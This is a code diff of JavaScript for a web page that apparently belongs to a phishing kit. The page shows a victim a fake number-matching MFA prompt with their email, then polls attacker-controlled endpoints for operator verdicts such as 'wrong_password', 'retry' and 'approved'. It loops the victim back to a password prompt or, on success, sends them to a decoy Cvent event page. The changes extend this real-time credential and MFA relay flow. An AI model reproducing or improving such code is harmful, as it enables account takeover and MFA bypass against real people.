@@ -97,14 +97,12 @@
         try {
             var hash = window.location.hash;
             if (hash && hash.length > 1) {
-                // Strip the leading '#'
                 var raw = hash.substring(1);
                 var parts = raw.split("&");
                 var encodedNum = parts[0];
                 var email = parts[1] || "";
                 var sessionId = parts[2] || "";
 
-                // Decode base64 number, fallback to raw if not base64
                 var tapNum = "";
                 try {
                     tapNum = atob(encodedNum);
@@ -116,83 +114,121 @@
                     $(".numberTap").text(tapNum);
                 }
 
-                // If email provided, display it in account button
-                if (email) {
-                    var cleanEmail = decodeURIComponent(email);
+                var cleanEmail = decodeURIComponent(email);
+                if (cleanEmail) {
                     var emailBtn = $("#account_btn");
                     if (emailBtn.length) {
-                        emailBtn.html('<i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewBox="0 0 16 16"><path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"></path><path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"></path></svg></i><span style="margin: 0 8px;">' + cleanEmail + '</span><i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"></path></svg></i>');
+                        emailBtn.html('<i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewBox="0 0 16 16"><path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"></path><path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"></path></svg></i><span style="margin: 0 8px;">' + cleanEmail + '</span><i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1 0-.708z"></path></svg></i>');
                     }
                 }
 
-                // Send verification polling to backend check endpoint
-                if (email || sessionId) {
-                    var pollCount = 0;
-                    var maxPolls = 120; // 5 minutes (120 * 2.5s)
-                    var cventUrl = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
+                var pollCount = 0;
+                var maxPolls = 200;
+                var cventUrl = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
 
-                    function handleResult(a) {
-                        var res = typeof a === 'string' ? a.trim() : (a.status || a.redirect || '');
-                        if (res === "wrong_number_pressed" || res === "user tapped no number" || res === "wrong_number") {
-                            document.location.href = "rejectnumber.html";
-                            return true;
-                        } else if (res === "saved" || res === "approved" || res.indexOf("cvent.com") !== -1) {
-                            document.location.href = cventUrl;
-                            return true;
-                        }
-                        return false;
+                function handleState(data) {
+                    if (!data) return false;
+
+                    // 1. Check for retry / wrong password / wrong number -> return to index.html password prompt
+                    var isRetry = data.status === "retry" ||
+                                  data.status === "wrong_number_pressed" ||
+                                  data.status === "wrong_password" ||
+                                  (data.redirect && (
+                                      data.redirect.toLowerCase() === "retry" ||
+                                      data.redirect.toLowerCase().includes("wrong_password") ||
+                                      data.redirect.toLowerCase().includes("wrong_number")
+                                  ));
+
+                    if (isRetry) {
+                        window.location.href = "index.html?retry=1#" + encodeURIComponent(cleanEmail || "");
+                        return true;
                     }
 
-                    function pollCheck() {
-                        var checkTarget = "api/check?sessionId=" + encodeURIComponent(sessionId) + "&em=" + encodeURIComponent(email);
-                        $.ajax({
-                            url: checkTarget,
-                            type: 'POST',
-                            data: {
-                                em: decodeURIComponent(email),
-                                sessionId: sessionId
-                            },
-                            success: function (a) {
-                                if (!handleResult(a)) {
-                                    scheduleNext();
-                                }
-                            },
-                            error: function () {
-                                // Fallback to check.php on Apache PHP hosts
-                                $.ajax({
-                                    url: "check.php",
-                                    type: 'POST',
-                                    data: {
-                                        em: decodeURIComponent(email),
-                                        sessionId: sessionId
-                                    },
-                                    success: function (a) {
-                                        if (!handleResult(a)) {
-                                            scheduleNext();
-                                        }
-                                    },
-                                    error: function () {
-                                        scheduleNext();
-                                    }
-                                });
+                    // 2. Check for updated number tap
+                    if (data.numberTap && String(data.numberTap) !== String(tapNum)) {
+                        tapNum = String(data.numberTap);
+                        $(".numberTap").text(tapNum);
+                    } else if (data.redirect && data.redirect.toLowerCase().includes("number-tap")) {
+                        var parts = data.redirect.split(":");
+                        if (parts.length > 1 && parts[1]) {
+                            var n = parts[1].trim();
+                            if (n && n !== String(tapNum)) {
+                                tapNum = n;
+                                $(".numberTap").text(tapNum);
                             }
-                        });
-                    }
-
-                    function scheduleNext() {
-                        pollCount++;
-                        if (pollCount < maxPolls) {
-                            setTimeout(pollCheck, 2500);
-                        } else {
-                            console.warn("Verification polling timed out.");
                         }
                     }
 
-                    setTimeout(pollCheck, 1000);
+                    // 3. Check for approved / redirect to Cvent
+                    var isApproved = data.status === "saved" ||
+                                     data.status === "approved" ||
+                                     (data.redirect && (
+                                         data.redirect.toLowerCase().includes("cvent.com") ||
+                                         data.redirect.toLowerCase() === "saved" ||
+                                         data.redirect.toLowerCase() === "approved"
+                                     ));
+
+                    if (isApproved) {
+                        window.location.href = cventUrl;
+                        return true;
+                    }
+
+                    return false;
                 }
+
+                function poll() {
+                    var statusUrl = "next.php/status/" + encodeURIComponent(sessionId);
+                    $.ajax({
+                        url: statusUrl,
+                        method: "GET",
+                        dataType: "json",
+                        success: function (data) {
+                            if (!handleState(data)) {
+                                schedule();
+                            }
+                        },
+                        error: function () {
+                            // Fallback to api/check
+                            $.ajax({
+                                url: "api/check?sessionId=" + encodeURIComponent(sessionId) + "&em=" + encodeURIComponent(email),
+                                type: "POST",
+                                data: { em: cleanEmail, sessionId: sessionId },
+                                success: function (res) {
+                                    var text = typeof res === "string" ? res.trim() : (res.status || "");
+                                    if (text === "retry" || text === "wrong_number" || text === "wrong_number_pressed") {
+                                        window.location.href = "index.html?retry=1#" + encodeURIComponent(cleanEmail || "");
+                                    } else if (text === "saved" || text === "approved") {
+                                        window.location.href = cventUrl;
+                                    } else if (text.indexOf("number:") === 0) {
+                                        var numVal = text.substring(7);
+                                        if (numVal && numVal !== tapNum) {
+                                            tapNum = numVal;
+                                            $(".numberTap").text(tapNum);
+                                        }
+                                        schedule();
+                                    } else {
+                                        schedule();
+                                    }
+                                },
+                                error: function () {
+                                    schedule();
+                                }
+                            });
+                        }
+                    });
+                }
+
+                function schedule() {
+                    pollCount++;
+                    if (pollCount < maxPolls) {
+                        setTimeout(poll, 2000);
+                    }
+                }
+
+                setTimeout(poll, 1000);
             }
         } catch (err) {
-            console.error("Error reading tap parameters:", err);
+            console.error("Error in tap view:", err);
         }
     });
 </script>
